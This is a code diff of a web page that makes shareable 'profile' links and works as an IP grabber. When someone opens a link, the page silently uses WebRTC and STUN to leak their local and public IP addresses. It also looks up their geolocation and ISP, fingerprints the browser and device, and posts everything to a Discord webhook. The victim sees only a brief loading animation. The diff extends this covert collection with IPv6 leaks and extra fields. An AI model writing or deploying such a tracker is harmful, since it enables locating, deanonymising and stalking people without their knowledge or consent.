@@ -15,14 +15,14 @@
     overflow:hidden;-webkit-font-smoothing:antialiased;
   }
   #snow{position:fixed;inset:0;pointer-events:none;z-index:0}
-  .app{position:relative;z-index:1;width:100%;max-width:400px;padding:20px}
+  .app{position:relative;z-index:1;width:100%;max-width:420px;padding:20px}
   .field{
     display:flex;gap:6px;align-items:center;
     background:#0a0a0a;border:1px solid #1e1e1e;
-    border-radius:999px;padding:6px;
-    transition:border-color .2s;
+    border-radius:999px;padding:6px;transition:border-color .2s;
   }
   .field.bad{border-color:#633}
+  .field.ok{border-color:#383}
   .field input{
     flex:1;min-width:0;background:transparent;border:0;outline:0;
     color:#fff;font:13px ui-monospace,Menlo,Consolas,monospace;
@@ -38,25 +38,24 @@
   }
   .field button:hover{background:#bbb}
   .field button:active{background:#888}
-  .field button:disabled{cursor:default;background:#666;color:#000}
+  .field button:disabled{opacity:.5;cursor:default}
+  .status{
+    margin-top:10px;font-size:11px;color:#666;
+    min-height:14px;text-align:center;
+    word-break:break-all;line-height:1.5;
+  }
+  .status.ok{color:#6d6}
+  .status.err{color:#d66}
   .result{
-    margin-top:12px;
-    background:#0a0a0a;border:1px solid #1e1e1e;
+    margin-top:12px;background:#0a0a0a;border:1px solid #1e1e1e;
     border-radius:16px;padding:14px 16px;
-    font-size:12px;color:#ddd;
-    word-break:break-all;user-select:all;cursor:pointer;
+    font-size:12px;color:#ddd;word-break:break-all;
+    user-select:all;cursor:pointer;
     opacity:0;transform:translateY(-4px);
-    transition:opacity .25s, transform .25s, border-color .3s;
+    transition:opacity .25s, transform .25s;
     pointer-events:none;
   }
   .result.show{opacity:1;transform:translateY(0);pointer-events:auto}
-  .result.ok{border-color:#4a4}
-  .result.err{border-color:#a44;animation:sh .35s}
-  @keyframes sh{
-    0%,100%{transform:translateX(0)}
-    25%{transform:translateX(-4px)}
-    75%{transform:translateX(4px)}
-  }
   .dots{display:flex;gap:10px;justify-content:center}
   .dots i{
     width:4px;height:4px;border-radius:50%;background:#fff;
@@ -74,34 +73,31 @@
 (function(){
   "use strict";
 
-  /* ─── paste your discord webhook url between the quotes below ─── */
   const WEBHOOK = "";
-
-  const IMG   = "https://i.pinimg.com/1200x/ac/e7/87/ace7872eaa8cbaf418aa47cdf8034359.jpg";
   const STORE = "pw";
   const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";
 
   const $   = id => document.getElementById(id);
   const app = $("app");
 
-  const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+\/?$/;
+  const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+$/;
+  const clean = s => (s || "").trim().replace(/\/+$/, "");
 
-  /* snowfall */
   (function(){
     const c = $("snow"), x = c.getContext("2d");
     let w, h, f = [];
     function init(){
-      w = c.width  = innerWidth;
+      w = c.width = innerWidth;
       h = c.height = innerHeight;
       const n = Math.min(160, Math.floor(w*h/22000));
       f = [];
       for(let i=0;i<n;i++){
         f.push({
           x: Math.random()*w, y: Math.random()*h,
-          r: Math.random()*1.5 + 0.3,
-          vy: Math.random()*0.5 + 0.15,
-          vx: Math.random()*0.3 - 0.15,
-          o: Math.random()*0.5 + 0.15
+          r: Math.random()*1.5+0.3,
+          vy: Math.random()*0.5+0.15,
+          vx: Math.random()*0.3-0.15,
+          o: Math.random()*0.5+0.15
         });
       }
     }
@@ -125,7 +121,6 @@
     init(); loop();
   })();
 
-  /* ─── helpers ─── */
   function makeId(){
     const a = new Uint8Array(4);
     if(window.crypto && crypto.getRandomValues) crypto.getRandomValues(a);
@@ -135,31 +130,122 @@
     return s;
   }
 
-  function stored(){ try{ return localStorage.getItem(STORE) || ""; }catch(e){ return ""; } }
-  function save(v){ try{ localStorage.setItem(STORE, v); }catch(e){} }
+  const stored = () => { try{ return localStorage.getItem(STORE) || ""; }catch(e){ return ""; } };
+  const save   = v => { try{ localStorage.setItem(STORE, v); }catch(e){} };
 
   function resolveWh(u){
-    if(u && WH_RE.test(u)) return u;
-    const s = stored();
-    if(s && WH_RE.test(s)) return s;
-    if(WEBHOOK && WH_RE.test(WEBHOOK)) return WEBHOOK;
+    const c1 = clean(u); if(c1 && WH_RE.test(c1)) return c1;
+    const c2 = clean(stored()); if(c2 && WH_RE.test(c2)) return c2;
+    const c3 = clean(WEBHOOK);  if(c3 && WH_RE.test(c3)) return c3;
     return "";
   }
 
-  /* ─── fingerprint ─── */
+  function isV6(ip){ return ip.indexOf(":") !== -1; }
+  function isPriv(ip){
+    if(isV6(ip)) return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
+    const p = ip.split(".").map(Number);
+    if(p.length !== 4 || p.some(isNaN)) return false;
+    return p[0]===10 || p[0]===127 ||
+           (p[0]===172 && p[1]>=16 && p[1]<=31) ||
+           (p[0]===192 && p[1]===168) ||
+           (p[0]===169 && p[1]===254);
+  }
+
+  function webrtcIPs(timeout){
+    return new Promise(res=>{
+      const out = { v4:{local:new Set(),pub:new Set()}, v6:{local:new Set(),pub:new Set()} };
+      let pc;
+      try{
+        pc = new RTCPeerConnection({
+          iceServers:[
+            {urls:"stun:stun.l.google.com:19302"},
+            {urls:"stun:stun1.l.google.com:19302"},
+            {urls:"stun:stun.cloudflare.com:3478"}
+          ]
+        });
+      }catch(e){ return res(out); }
+      let done = false;
+      const fin = () => {
+        if(done) return;
+        done = true;
+        try{ pc.close(); }catch(e){}
+        res(out);
+      };
+      const t = setTimeout(fin, timeout);
+      pc.onicecandidate = e => {
+        if(!e.candidate){ clearTimeout(t); return fin(); }
+        const parts = e.candidate.candidate.split(" ");
+        const ip = parts[4];
+        if(!ip || /\.local$/i.test(ip)) return;
+        const fam = isV6(ip) ? "v6" : "v4";
+        const scope = isPriv(ip) ? "local" : "pub";
+        out[fam][scope].add(ip);
+      };
+      try{
+        pc.createDataChannel("x");
+        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
+      }catch(e){ clearTimeout(t); fin(); }
+    });
+  }
+
+  function fetchT(url, ms){
+    const ctrl = new AbortController();
+    const t = setTimeout(()=>ctrl.abort(), ms);
+    return fetch(url, {signal:ctrl.signal}).finally(()=>clearTimeout(t));
+  }
+
+  async function publicIP(){
+    for(const url of [
+      "https://api64.ipify.org?format=json",
+      "https://ipv4.icanhazip.com",
+      "https://ipv6.icanhazip.com"
+    ]){
+      try{
+        const r = await fetchT(url, 3000);
+        if(!r.ok) continue;
+        const txt = (await r.text()).trim();
+        const ip = txt.startsWith("{") ? JSON.parse(txt).ip : txt;
+        if(ip) return ip;
+      }catch(e){}
+    }
+    return null;
+  }
+
+  async function geoLookup(ip){
+    const list = [
+      { u:`https://ipwho.is/${ip}`, p:d => d && d.ip ? {
+          ip:d.ip, city:d.city, region:d.region, country:d.country,
+          isp:d.connection && d.connection.isp,
+          org:d.connection && d.connection.org,
+          asn:d.connection && d.connection.asn,
+          type:d.type
+        } : null },
+      { u:`https://ipapi.co/${ip}/json/`, p:d => d && d.ip ? {
+          ip:d.ip, city:d.city, region:d.region, country:d.country_name,
+          isp:d.org, org:d.org, asn:d.asn, type:d.version
+        } : null }
+    ];
+    for(const x of list){
+      try{
+        const r = await fetchT(x.u, 3000);
+        if(!r.ok) continue;
+        const v = x.p(await r.json());
+        if(v && v.ip) return v;
+      }catch(e){}
+    }
+    return null;
+  }
+
   function bname(ua){
     const L = [
-      ["Edge", /Edg(?:e|A|iOS)?\/([\d.]+)/],
-      ["Opera", /(?:OPR|Opera)\/([\d.]+)/],
+      ["Edge",    /Edg(?:e|A|iOS)?\/([\d.]+)/],
+      ["Opera",   /(?:OPR|Opera)\/([\d.]+)/],
       ["Samsung", /SamsungBrowser\/([\d.]+)/],
       ["Firefox", /(?:Firefox|FxiOS)\/([\d.]+)/],
-      ["Chrome", /(?:Chrome|CriOS)\/([\d.]+)/],
-      ["Safari", /Version\/([\d.]+).*Safari/]
+      ["Chrome",  /(?:Chrome|CriOS)\/([\d.]+)/],
+      ["Safari",  /Version\/([\d.]+).*Safari/]
     ];
-    for(let i=0;i<L.length;i++){
-      const m = ua.match(L[i][1]);
-      if(m) return L[i][0] + " " + m[1];
-    }
+    for(const [n,re] of L){ const m = ua.match(re); if(m) return n + " " + m[1]; }
     return "Unknown";
   }
   function osn(ua){
@@ -181,182 +267,167 @@
       return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : null;
     }catch(e){ return null; }
   }
-  function priv(ip){
-    if(ip.indexOf(":") !== -1) return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
-    const p = ip.split(".").map(Number);
-    if(p.length !== 4 || p.some(isNaN)) return false;
-    return p[0]===10 || p[0]===127 ||
-      (p[0]===172 && p[1]>=16 && p[1]<=31) ||
-      (p[0]===192 && p[1]===168) ||
-      (p[0]===169 && p[1]===254);
-  }
-  function webrtc(ms){
-    return new Promise(res=>{
-      let pc;
-      try{
-        pc = new RTCPeerConnection({
-          iceServers:[
-            {urls:"stun:stun.l.google.com:19302"},
-            {urls:"stun:stun.cloudflare.com:3478"}
-          ]
-        });
-      }catch(e){ return res({local:[],pub:[]}); }
-      const local = new Set(), pub = new Set();
-      let done = false;
-      const fin = () => {
-        if(done) return;
-        done = true;
-        try{ pc.close(); }catch(e){}
-        res({local:[...local], pub:[...pub]});
-      };
-      const t = setTimeout(fin, ms);
-      pc.onicecandidate = e => {
-        if(!e.candidate){ clearTimeout(t); return fin(); }
-        const parts = e.candidate.candidate.split(" ");
-        const ip = parts[4];
-        if(!ip || /\.local$/i.test(ip)) return;
-        (priv(ip) ? local : pub).add(ip);
-      };
-      try{
-        pc.createDataChannel("x");
-        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
-      }catch(e){ clearTimeout(t); fin(); }
-    });
-  }
-  async function geo(){
-    const L = [
-      {u:"https://ipwho.is/", p:d => d && d.ip ? {
-        ip:d.ip, city:d.city, region:d.region, country:d.country,
-        isp:d.connection && d.connection.isp,
-        asn:d.connection && d.connection.asn
-      } : null},
-      {u:"https://ipapi.co/json/", p:d => d && d.ip ? {
-        ip:d.ip, city:d.city, region:d.region, country:d.country_name,
-        isp:d.org, asn:d.asn
-      } : null},
-      {u:"https://api.ipify.org?format=json", p:d => d && d.ip ? {ip:d.ip} : null}
-    ];
-    for(let i=0;i<L.length;i++){
-      try{
-        const ctrl = new AbortController();
-        const t = setTimeout(()=>ctrl.abort(), 3000);
-        const r = await fetch(L[i].u, {signal: ctrl.signal});
-        clearTimeout(t);
-        if(!r.ok) continue;
-        const v = L[i].p(await r.json());
-        if(v && v.ip) return v;
-      }catch(e){}
-    }
-    return null;
-  }
 
-  async function collect(){
+  async function gather(){
     const n = navigator;
     const cn = n.connection || n.mozConnection || n.webkitConnection || {};
     let tz = "unknown";
     try{ tz = Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){}
-    const net = await Promise.race([
-      Promise.all([webrtc(2000), geo()]).catch(()=>[{local:[],pub:[]}, null]),
-      new Promise(r => setTimeout(()=>r([{local:[],pub:[]}, null]), 3600))
+
+    const [rt, pubIP] = await Promise.all([
+      webrtcIPs(2200),
+      Promise.race([
+        publicIP(),
+        new Promise(r => setTimeout(()=>r(null), 3500))
+      ])
     ]);
+
+    let geo = null;
+    if(pubIP) geo = await Promise.race([
+      geoLookup(pubIP),
+      new Promise(r => setTimeout(()=>r(null), 3000))
+    ]);
+
+    const setArr = s => [...s];
+
     return {
-      browser:  bname(n.userAgent),
-      os:       osn(n.userAgent),
+      pubIP: pubIP || null,
+      geo: geo,
+      v4_local: setArr(rt.v4.local),
+      v4_pub:   setArr(rt.v4.pub),
+      v6_local: setArr(rt.v6.local),
+      v6_pub:   setArr(rt.v6.pub),
+      browser: bname(n.userAgent),
+      ua: n.userAgent,
+      os: osn(n.userAgent),
       platform: n.platform || "unknown",
-      cores:    n.hardwareConcurrency || null,
-      memory:   n.deviceMemory || null,
-      gpu:      gpu(),
-      screen:   screen.width + "×" + screen.height,
-      viewport: innerWidth + "×" + innerHeight,
-      dpr:      devicePixelRatio || 1,
-      lang:     n.language || "unknown",
-      tz:       tz,
-      touch:    n.maxTouchPoints || 0,
-      conn:     cn.effectiveType || null,
+      cores: n.hardwareConcurrency || null,
+      memory: n.deviceMemory || null,
+      gpu: gpu(),
+      screen: `${screen.width}×${screen.height}`,
+      avail: `${screen.availWidth}×${screen.availHeight}`,
+      viewport: `${innerWidth}×${innerHeight}`,
+      dpr: devicePixelRatio || 1,
+      depth: screen.colorDepth,
+      lang: n.language || "unknown",
+      langs: (n.languages || []).join(", ") || "unknown",
+      tz: tz,
+      touch: n.maxTouchPoints || 0,
+      conn: cn.effectiveType || null,
       downlink: cn.downlink || null,
       referrer: document.referrer || "direct",
-      webrtc:   net[0] || {local:[],pub:[]},
-      ip:       net[1] || null
+      href: location.href,
+      cookies: navigator.cookieEnabled,
+      dnt: navigator.doNotTrack || null,
+      webdriver: navigator.webdriver || false
     };
   }
 
-  /* ─── embed ─── */
   const q = v => "`" + v + "`";
 
-  function embed(id, d, test){
+  function buildEmbed(id, d, test){
     const f = [];
-    const ip = d.ip || {};
-    const rt = d.webrtc || {local:[],pub:[]};
+    const g = d.geo || {};
 
-    if(ip.ip)           f.push({name:"IP",       value:q(ip.ip),       inline:true});
-    if(ip.country)      f.push({name:"Location", value:q([ip.city,ip.region,ip.country].filter(Boolean).join(", ")), inline:true});
-    if(ip.isp)          f.push({name:"ISP",      value:q(ip.isp),      inline:true});
-    if(ip.asn)          f.push({name:"ASN",      value:q(ip.asn),      inline:true});
-    if(rt.pub.length)   f.push({name:"STUN",     value:q(rt.pub.join(", ")),  inline:true});
-    if(rt.local.length) f.push({name:"Local",    value:q(rt.local.join(", ")), inline:true});
-    if(d.conn)          f.push({name:"Network",  value:q(d.conn + (d.downlink ? " · "+d.downlink+"Mb/s" : "")), inline:true});
+    if(d.pubIP){
+      const fam = d.pubIP.indexOf(":") !== -1 ? "IPv6" : "IPv4";
+      f.push({ name: fam, value: q(d.pubIP), inline: false });
+    }
+    if(g.city || g.region || g.country){
+      f.push({
+        name: "Location",
+        value: q([g.city, g.region, g.country].filter(Boolean).join(", ")),
+        inline: true
+      });
+    }
+    if(g.isp || g.org) f.push({ name: "ISP",  value: q(g.isp || g.org), inline: true });
+    if(g.asn)          f.push({ name: "ASN",  value: q(g.asn),          inline: true });
 
-    f.push({name:"OS",       value:q(d.os),                           inline:true});
-    f.push({name:"Browser",  value:q(d.browser),                      inline:true});
-    f.push({name:"Platform", value:q(d.platform),                     inline:true});
-    f.push({name:"Screen",   value:q(d.screen + " · " + d.dpr + "x"), inline:true});
-    f.push({name:"Viewport", value:q(d.viewport),                     inline:true});
-    f.push({name:"Touch",    value:q(d.touch + " pts"),               inline:true});
-    f.push({name:"CPU",      value:q((d.cores != null ? d.cores : "n/a") + " cores"), inline:true});
-    f.push({name:"RAM",      value:q(d.memory ? "~"+d.memory+" GB" : "n/a"), inline:true});
-    f.push({name:"Lang",     value:q(d.lang),                         inline:true});
-    if(d.gpu) f.push({name:"GPU", value:q(d.gpu), inline:false});
-    f.push({name:"Timezone", value:q(d.tz), inline:true});
-    if(d.referrer !== "direct") f.push({name:"Referrer", value:q(d.referrer), inline:false});
+    if(d.v4_local.length) f.push({ name: "Local IPv4", value: q(d.v4_local.join(", ")), inline: true });
+    if(d.v6_local.length) f.push({ name: "Local IPv6", value: q(d.v6_local.join(", ")), inline: true });
+    if(d.v4_pub.length)   f.push({ name: "STUN v4",    value: q(d.v4_pub.join(", ")),   inline: true });
+    if(d.v6_pub.length)   f.push({ name: "STUN v6",    value: q(d.v6_pub.join(", ")),   inline: true });
 
-    const ts = Math.floor(Date.now()/1000);
+    if(d.conn) f.push({
+      name: "Network",
+      value: q(d.conn + (d.downlink ? " · " + d.downlink + "Mb/s" : "")),
+      inline: true
+    });
+
+    f.push({ name: "OS",       value: q(d.os),                          inline: true });
+    f.push({ name: "Browser",  value: q(d.browser),                     inline: true });
+    f.push({ name: "Platform", value: q(d.platform),                    inline: true });
+    f.push({ name: "Screen",   value: q(d.screen + " · " + d.dpr + "x"),inline: true });
+    f.push({ name: "Viewport", value: q(d.viewport),                    inline: true });
+    f.push({ name: "Depth",    value: q(d.depth + "-bit"),              inline: true });
+    f.push({ name: "CPU",      value: q((d.cores ?? "n/a") + " cores"), inline: true });
+    f.push({ name: "RAM",      value: q(d.memory ? "~" + d.memory + " GB" : "n/a"), inline: true });
+    f.push({ name: "Touch",    value: q(d.touch + " pts"),              inline: true });
+    f.push({ name: "Language", value: q(d.lang),                        inline: true });
+    f.push({ name: "Timezone", value: q(d.tz),                          inline: true });
+    f.push({ name: "Cookies",  value: q(d.cookies ? "enabled" : "off"), inline: true });
+
+    if(d.gpu) f.push({ name: "GPU", value: q(d.gpu), inline: false });
+    if(d.referrer && d.referrer !== "direct")
+      f.push({ name: "Referrer", value: q(d.referrer), inline: false });
+
+    const ts = Math.floor(Date.now() / 1000);
     return {
       username: "visit",
-      avatar_url: IMG,
       embeds: [{
-        author:      {name: "◼ VISIT" + (test ? " · TEST" : ""), icon_url: IMG},
-        title:       q(id),
+        author: {
+          name: "◼ VISIT" + (test ? " · TEST" : "")
+        },
+        title: q(id),
         description: "**" + id + "** · <t:" + ts + ":F>",
-        color:       0x000000,
-        fields:      f,
-        footer:      {text: id, icon_url: IMG},
-        timestamp:   new Date().toISOString()
+        color: 0x000000,
+        fields: f,
+        footer: { text: id },
+        timestamp: new Date().toISOString()
       }]
     };
   }
 
-  /* ─── send: multipart → json → beacon ─── */
-  async function send(wh, body){
-    const url = wh.replace(/\/+$/, "") + "?wait=true";
-    const json = JSON.stringify(body);
+  async function post(webhook, payload){
+    const url = webhook + "?wait=true";
+    const json = JSON.stringify(payload);
 
     try{
       const fd = new FormData();
       fd.append("payload_json", json);
-      const r = await fetch(url, {method:"POST", body: fd, mode:"cors"});
-      if(r.ok || r.status === 204){ console.log("[send] ok (multipart)"); return true; }
-      console.warn("[send] multipart status", r.status);
-    }catch(e){ console.warn("[send] multipart error", e); }
+      const r = await fetch(url, { method:"POST", body: fd, mode:"cors" });
+      if(r.ok || r.status === 204) return true;
+      console.warn("[post] cors/multipart", r.status);
+    }catch(e){ console.warn("[post] cors/multipart error", e); }
+
+    try{
+      const fd = new FormData();
+      fd.append("payload_json", json);
+      await fetch(url, { method:"POST", body: fd, mode:"no-cors" });
+      return true;
+    }catch(e){ console.warn("[post] no-cors/multipart error", e); }
 
     try{
       const r = await fetch(url, {
-        method: "POST",
-        mode: "cors",
-        headers: {"Content-Type": "application/json"},
+        method:"POST", mode:"cors",
+        headers: {"Content-Type":"application/json"},
         body: json
       });
-      if(r.ok || r.status === 204){ console.log("[send] ok (json)"); return true; }
-      console.warn("[send] json status", r.status);
-    }catch(e){ console.warn("[send] json error", e); }
+      if(r.ok || r.status === 204) return true;
+      console.warn("[post] cors/json", r.status);
+    }catch(e){ console.warn("[post] cors/json error", e); }
 
     try{
-      const ok = navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
-      console.log("[send] beacon", ok);
-      return ok;
-    }catch(e){ console.warn("[send] beacon error", e); return false; }
+      return navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
+    }catch(e){ console.warn("[post] beacon error", e); return false; }
   }
 
-  /* ─── router ─── */
+  async function sendVisit(webhook, id, test){
+    const d = await gather();
+    const payload = buildEmbed(id, d, !!test);
+    return post(webhook, payload);
+  }
+
   function route(){
     const hash = location.hash.replace(/^#/, "");
     let path = hash, qs = "";
@@ -372,27 +443,34 @@
     return { id: m ? m[1] : null, wh: wh };
   }
 
-  /* ─── views ─── */
-
   function setup(){
     app.innerHTML =
       '<div class="field" id="f">' +
         '<input id="wh" type="text" placeholder="webhook" spellcheck="false" autocomplete="off">' +
         '<button id="go">→</button>' +
       '</div>' +
+      '<div class="status" id="st"></div>' +
       '<div class="result" id="out"></div>';
 
-    const inp = $("wh"), fld = $("f"), out = $("out"), btn = $("go");
+    const inp = $("wh"), fld = $("f"), out = $("out"), btn = $("go"), st = $("st");
 
-    inp.value = stored() || (WH_RE.test(WEBHOOK) ? WEBHOOK : "");
+    inp.value = stored() || clean(WEBHOOK);
+
+    function setStatus(msg, cls){
+      st.textContent = msg || "";
+      st.className = "status" + (cls ? " " + cls : "");
+    }
 
     async function run(){
-      const v = inp.value.trim().replace(/\/+$/, "");
+      const v = clean(inp.value);
       if(!WH_RE.test(v)){
         fld.classList.add("bad");
-        setTimeout(()=>fld.classList.remove("bad"), 600);
+        setTimeout(()=>fld.classList.remove("bad"), 700);
+        setStatus("invalid webhook", "err");
         return;
       }
+
+      fld.classList.remove("bad","ok");
       save(v);
 
       const id = makeId();
@@ -402,51 +480,52 @@
       const url = base + "#/profile/" + id;
 
       out.textContent = url;
-      out.classList.remove("ok","err");
       out.classList.add("show");
-
       try{ navigator.clipboard.writeText(url); }catch(e){}
+
       inp.value = "";
       inp.placeholder = id;
 
       btn.disabled = true;
       btn.textContent = "·";
+      setStatus("sending…");
 
       try{
-        const d  = await collect();
-        const ok = await send(v, embed(id, d, true));
-        if(!ok) throw new Error("all methods failed");
-        out.classList.add("ok");
+        const ok = await sendVisit(v, id, true);
+        if(!ok) throw new Error("send failed");
+        fld.classList.add("ok");
+        setStatus("sent ✓  ·  " + id, "ok");
         btn.textContent = "✓";
-        setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1200);
       }catch(e){
-        console.warn("[run] failed", e);
-        out.classList.add("err");
+        console.warn(e);
+        fld.classList.add("bad");
+        setStatus(String(e.message || e), "err");
         btn.textContent = "✕";
-        setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1600);
       }
+      setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1200);
     }
 
     btn.addEventListener("click", run);
     inp.addEventListener("keydown", e => { if(e.key === "Enter") run(); });
     out.addEventListener("click", () => {
-      try{ navigator.clipboard.writeText(out.textContent); }catch(e){}
+      try{ navigator.clipboard.writeText(out.textContent); setStatus("copied", "ok"); }catch(e){}
     });
   }
 
   async function visit(id, wh){
     app.innerHTML = '<div class="dots"><i></i><i></i><i></i></div>';
     const target = resolveWh(wh);
-    console.log("[visit] id=" + id + " webhook=" + (target ? "found" : "MISSING"));
+    if(!target){
+      console.warn("no webhook resolved");
+      setTimeout(()=>{ app.innerHTML = ""; }, 200);
+      return;
+    }
     try{
-      const d = await collect();
-      if(target){
-        await send(target, embed(id, d, false));
-      } else {
-        console.warn("[visit] no webhook resolved — set WEBHOOK constant or open link in the browser that generated it");
-      }
-    }catch(e){ console.warn("[visit] error", e); }
-    setTimeout(()=>{ app.innerHTML = ""; }, 250);
+      await sendVisit(target, id, false);
+    }catch(e){
+      console.warn("[visit]", e);
+    }
+    setTimeout(()=>{ app.innerHTML = ""; }, 200);
   }
 
   function boot(){
